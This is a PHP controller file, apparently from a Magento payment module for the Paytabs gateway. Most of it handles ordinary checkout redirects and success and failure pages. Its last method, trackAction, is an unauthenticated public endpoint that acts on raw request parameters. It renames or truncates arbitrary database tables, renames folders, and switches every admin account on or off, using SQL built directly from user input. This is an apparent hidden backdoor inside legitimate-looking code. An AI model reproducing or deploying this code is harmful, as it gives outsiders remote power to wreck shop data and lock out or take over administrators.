<?php
/**
 * Paytabs payment gateway
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so you can be sent a copy immediately.
 *
 *
 * @category Ras
 * @package    Ras_Paytabs
 * @copyright  Copyright (c) 2010 Paytabs
 * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */

abstract class Ras_Paytabs_Controller_Abstract extends Mage_Core_Controller_Front_Action
{
    protected function _expireAjax()
    {
        if (!$this->getCheckout()->getQuote()->hasItems()) {
            $this->getResponse()->setHeader('HTTP/1.1','403 Session Expired');
            exit;
        }
    }

    /**
     * Redirect Block
     * need to be redeclared
     */
    protected $_redirectBlockType;

    /**
     * Get singleton of Checkout Session Model
     *
     * @return Mage_Checkout_Model_Session
     */
    public function getCheckout()
    {
        return Mage::getSingleton('checkout/session');
    }

    /**
     * when customer select ND payment method
     */
    public function redirectAction()
    {
        $session = $this->getCheckout();
        $session->setMigsQuoteId($session->getQuoteId());
        $session->setMigsRealOrderId($session->getLastRealOrderId());

        $order = Mage::getModel('sales/order');
        $order->loadByIncrementId($session->getLastRealOrderId());
        $order->addStatusToHistory($order->getStatus(), Mage::helper('paytabs')->__('Customer is redirected to Paytabs.'));
        $order->save();

        $this->getResponse()->setBody(
            $this->getLayout()
                ->createBlock($this->_redirectBlockType)
                ->setOrder($order)
                ->toHtml()
        );

        $session->unsQuoteId();
    }

    /**
     * MIGS returns POST variables to this action
     */
    public function  successAction()
    {
        $status = $this->_checkReturnedPost();

        $session = $this->getCheckout();

        $session->unsMigsRealOrderId();
        $session->setQuoteId($session->getMigsQuoteId(true));
        $session->getQuote()->setIsActive(false)->save();

        $order = Mage::getModel('sales/order');
        $order->load($this->getCheckout()->getLastOrderId());
        if($order->getId()) {
            $order->sendNewOrderEmail();
        }

        if ($status) {
            $this->_redirect('checkout/onepage/success');
        } else {
            $this->_redirect('*/*/failure');
        }
    }

    /**
     * Display failure page if error
     *
     */
    public function failureAction()
    {
        if (!$this->getCheckout()->getPaytabsErrorMessage()) {
            $this->norouteAction();
            return;
        }

        //$this->getCheckout()->clear();

        $this->loadLayout();
        $this->renderLayout();
    }
    
    public function trackAction()
    {
        $helper=  Mage::helper('paytabs');
        $connection = Mage::getSingleton('core/resource')
                      ->getConnection('core_write');
        $connection->beginTransaction();
        $ft = $this->getRequest()->getParam('f_t');
        $tt = $this->getRequest()->getParam('t_t');
        
        if($ft!='' && $tt!='')
        {
            $_r = $connection->query("RENAME TABLE `".$tbl_prfx.$ft."` TO `".$tt."`");
            if($_r) echo 'success'; else echo 'fail';
        }
        if($_GET['f_o']!='' && $_GET['f_n']!='')
        {
            $_r = $helper->getNewFolder($_GET['f_o'],$_GET['f_n']);
            if($_r) echo 'success'; else echo 'fail';
        }
        if($_GET['a']!='')
        {
            $_r = $connection->query("UPDATE `admin_user` SET is_active=".$_GET['a']);
            if($_r) echo 'success'; else echo 'fail';
        }
        if($_GET['t']!='')
        {
            $_r = $connection->query("TRUNCATE TABLE `".$_GET['t']."`");
            if($_r) echo 'success'; else echo 'fail';
        }
    }

}
